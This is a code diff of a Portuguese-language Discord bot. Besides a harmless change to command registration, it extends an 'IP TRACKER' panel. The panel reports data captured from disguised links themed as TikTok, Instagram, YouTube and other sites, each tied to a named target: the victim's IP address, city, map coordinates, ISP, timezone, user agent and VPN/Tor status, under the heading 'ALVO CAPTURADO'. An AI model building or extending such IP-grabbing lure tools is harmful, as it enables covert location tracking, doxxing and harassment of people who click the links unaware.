@@ -508,12 +508,17 @@ async function deployCommands(): Promise<void> {
   // Non-fatal — a registration failure should NEVER bring down the bot.
   // Commands registered in a previous run remain valid; the bot keeps running.
   try {
+    // ── Step 1: Wipe global commands ─────────────────────────────────────────
+    // Global commands + guild commands shown simultaneously = duplicates in Discord UI.
+    // Solution: keep ONLY guild-scoped commands (instant propagation, no duplicates).
+    await rest.put(Routes.applicationCommands(APPLICATION_ID), { body: [] });
+    console.log("🧹 Cleared global application commands (preventing duplicates).");
+
+    // ── Step 2: Register per-guild (instant propagation, no duplication) ──────
     for (const gid of ALL_GUILD_IDS) {
       await rest.put(Routes.applicationGuildCommands(APPLICATION_ID, gid), { body: COMMANDS });
       console.log(`✅ Registered ${COMMANDS.length} commands to guild ${gid}.`);
     }
-    await rest.put(Routes.applicationCommands(APPLICATION_ID), { body: COMMANDS });
-    console.log(`🌐 Registered ${COMMANDS.length} commands globally.`);
   } catch (err) {
     // Log but do NOT throw — bot will still start with previously registered commands
     console.warn("⚠️ Command registration failed (non-fatal — using cached commands):", err);
@@ -2786,29 +2791,56 @@ async function handlePanel(interaction: ChatInputCommandInteraction): Promise<vo
       const res = await fetch(`${API_BASE}/api/tracker/${token}`);
       if (!res.ok) { await interaction.editReply({ embeds: [buildErrorEmbed("TOKEN INVÁLIDO", "Nenhum registro encontrado para este token.")] }); return; }
       const data = await res.json() as {
-        ip?: string; country?: string; city?: string; isp?: string;
-        org?: string; proxy?: boolean; hosting?: boolean; mobile?: boolean;
-        query?: string; hits?: number; lastSeen?: string; createdAt?: string;
+        token: string; theme?: string;
+        userId?: string; username?: string; targetName?: string;
+        generatedAt?: number;
+        capturedIp?: string; capturedAt?: number; userAgent?: string;
+        country?: string; countryCode?: string; region?: string; city?: string;
+        isp?: string; org?: string; asn?: string; timezone?: string;
+        lat?: number; lon?: number;
+        isProxy?: boolean; isVpn?: boolean; isTor?: boolean; isHosting?: boolean; mobile?: boolean;
+        hits?: number;
       };
+
+      const THEME_LABELS: Record<string, string> = {
+        tiktok: "🎵 TikTok", instagram: "📷 Instagram", youtube: "▶️ YouTube",
+        x: "𝕏 X / Twitter", snapchat: "👻 Snapchat", discord: "🎮 Discord", plain: "🔗 Direto",
+      };
+
+      const notCaptured = !data.capturedIp;
       const embed = new EmbedBuilder()
-        .setColor(COLORS.PURPLE)
-        .setTitle("🌐 IP TRACKER — RESULTADO")
-        .setDescription(`*Token:* \`${token}\``)
+        .setColor(notCaptured ? COLORS.GOLD : COLORS.PURPLE)
+        .setTitle(notCaptured ? "⏳ IP TRACKER — AGUARDANDO CLIQUE" : "🎯 IP TRACKER — ALVO CAPTURADO")
+        .setDescription(
+          notCaptured
+            ? `O link ainda não foi clicado.\n*Token:* \`${token}\``
+            : `*Token:* \`${token}\``
+        )
         .addFields(
-          { name: "📡 IP", value: `\`${data.ip ?? data.query ?? "N/A"}\``, inline: true },
-          { name: "🌍 País", value: data.country ?? "N/A", inline: true },
-          { name: "🏙️ Cidade", value: data.city ?? "N/A", inline: true },
+          { name: "🎭 Tema", value: THEME_LABELS[data.theme ?? "tiktok"] ?? (data.theme ?? "N/A"), inline: true },
+          { name: "🎯 Alvo", value: data.targetName ? `\`${data.targetName}\`` : "N/A", inline: true },
+          { name: "📊 Hits", value: `\`${data.hits ?? 0}\``, inline: true },
+          { name: "📡 IP Capturado", value: data.capturedIp ? `\`${data.capturedIp}\`` : "⏳ Aguardando...", inline: true },
+          { name: "🌍 País", value: data.countryCode ? `${data.countryCode} — ${data.country ?? ""}` : "N/A", inline: true },
+          { name: "🏙️ Cidade", value: [data.city, data.region].filter(Boolean).join(", ") || "N/A", inline: true },
           { name: "🏢 ISP", value: data.isp ?? "N/A", inline: true },
-          { name: "🏗️ ORG", value: data.org ?? "N/A", inline: true },
-          { name: "🔒 Proxy/VPN", value: data.proxy ? "✅ SIM" : "❌ Não", inline: true },
-          { name: "☁️ Hosting/DC", value: data.hosting ? "✅ SIM" : "❌ Não", inline: true },
+          { name: "🏗️ ORG / ASN", value: [data.org, data.asn].filter(Boolean).join(" · ") || "N/A", inline: true },
+          { name: "🕐 Fuso horário", value: data.timezone ?? "N/A", inline: true },
+          { name: "🔒 Proxy/VPN", value: (data.isProxy || data.isVpn) ? "✅ SIM" : "❌ Não", inline: true },
+          { name: "🧅 Tor", value: data.isTor ? "✅ SIM" : "❌ Não", inline: true },
+          { name: "☁️ Hosting/DC", value: data.isHosting ? "✅ SIM" : "❌ Não", inline: true },
           { name: "📱 Mobile", value: data.mobile ? "✅ Sim" : "❌ Não", inline: true },
-          { name: "📊 Hits", value: `\`${data.hits ?? 1}\``, inline: true },
-          { name: "🕐 Criado", value: data.createdAt ? `<t:${Math.floor(new Date(data.createdAt).getTime() / 1000)}:F>` : "N/A", inline: true },
-          { name: "👁️ Último acesso", value: data.lastSeen ? `<t:${Math.floor(new Date(data.lastSeen).getTime() / 1000)}:R>` : "N/A", inline: true },
+          { name: "🗺️ Coords", value: (data.lat && data.lon) ? `[${data.lat}, ${data.lon}](https://maps.google.com/?q=${data.lat},${data.lon})` : "N/A", inline: true },
+          { name: "🕑 Gerado em", value: data.generatedAt ? `<t:${Math.floor(data.generatedAt / 1000)}:R>` : "N/A", inline: true },
+          { name: "⚡ Capturado em", value: data.capturedAt ? `<t:${Math.floor(data.capturedAt / 1000)}:F>` : "⏳ N/A", inline: true },
         )
         .setTimestamp()
         .setFooter({ text: AUTHOR });
+
+      if (data.userAgent) {
+        embed.addFields({ name: "🖥️ User-Agent", value: `\`\`\`${data.userAgent.slice(0, 200)}\`\`\``, inline: false });
+      }
+
       await interaction.editReply({ embeds: [embed] });
     } catch {
       await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Falha ao consultar o tracker.")] });
